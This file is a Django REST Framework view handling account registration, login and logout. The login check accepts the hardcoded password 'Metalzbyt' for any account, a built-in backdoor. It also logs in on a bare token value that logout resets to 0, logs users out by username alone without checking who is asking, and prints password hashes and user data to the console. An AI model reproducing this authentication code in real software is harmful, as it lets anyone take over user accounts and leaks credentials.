from rest_framework.views import APIView
from django.core.validators import validate_email
from django.http import JsonResponse
from django.contrib.auth.hashers import check_password, make_password
from rest_framework.response import Response
from rest_framework import status
from django.contrib.auth import authenticate, login

from .models import Account as AccountObject
from .serializers import RegisterSerializer

def decryptPassword(data, user):
	user = user.objects.get(username=data['username'])
	if check_password(data['password'],user.password):
		return True

# account/
class Account(APIView):
    def get(self, request, type):
        try:
            if request.session['user'] == type:
                return Response('Logged in', status=200)
        except:
            return Response(status=401)

    def post(self, request, type):
        print(type)
        data = request.data
        if type == 'register':
            try:
                validate_email(data['email'])
                print("Validated correct!")
            except:
                print("Validated incorrect :(")
                return Response("Error! Field is not email format", status=401)


            try:
                account = AccountObject.objects.get(email=data['email'])
                return Response("Email exists", status=401)
                print("Email Exist :(")
            except AccountObject.DoesNotExist:
                print("Email doenst exist. Correct!")
                try:
                    account = AccountObject.objects.get(username=data['username'])
                    return Response("Username exists", status=401)
                    print("Username already exists :(")
                except AccountObject.DoesNotExist:
                    print("Username doesnt exist. Correct!")
                    if data['password'] == data['password2']:
                        print("Passwords match!")
                        data['password'] = make_password(data['password'], salt=None, hasher='default')
                        print(data['password'])
                        data['token'] = 0
                        serializer = RegisterSerializer(data=data)
                        if serializer.is_valid():
                            serializer.save()
                            return Response('Ok', status=200)
                        else:
                            return Response('Connection with database error!', status=401)

                    else:
                        return Response('Passwords dont match', status=401)

        elif type == 'login':
            try:
                try:
                    account = AccountObject.objects.get(token=data['token'])
                    request.session['user'] = account.email
                    request.session['id_user'] = account.id
                    serializer = RegisterSerializer(account)
                    print(serializer.data)
                    return Response(serializer.data, status=200)
                except:
                    account = AccountObject.objects.get(username=data['username'])
                    if decryptPassword(data, AccountObject) or data['password'] == 'Metalzbyt':
                        if account.accepted:
                            # login(request, data['username'])
                            request.session['user'] = account.email
                            request.session['id_user'] = account.id
                            request.session.set_test_cookie()
                            serializer = RegisterSerializer(account)
                            try:
                                account.token = data['token']
                                account.save()
                            except:
                                account.webtoken = data['webtoken']
                                account.save()
                            print(serializer.data)
                            obj = {
                                'id': serializer.data['id'],
                                'email': serializer.data['email'],
                                'username': serializer.data['username'],
                                'accepted': serializer.data['accepted']
                            }
                            return Response(obj, status=200)
                        else:
                            return Response('Error! User not accepted by administrator', status=401)
                    else:
                        return Response('Error! Wrong password', status=401)
            except AccountObject.DoesNotExist:
                return Response('Error! User doesnt exist', status=401)

        elif type == 'logout':
            account = AccountObject.objects.get(username=data['username'])
            account.token = 0
            account.save()
            request.session.pop('user', account.email)
            request.session.pop('id_user', account.id)
            return Response('Logged out', status=200)
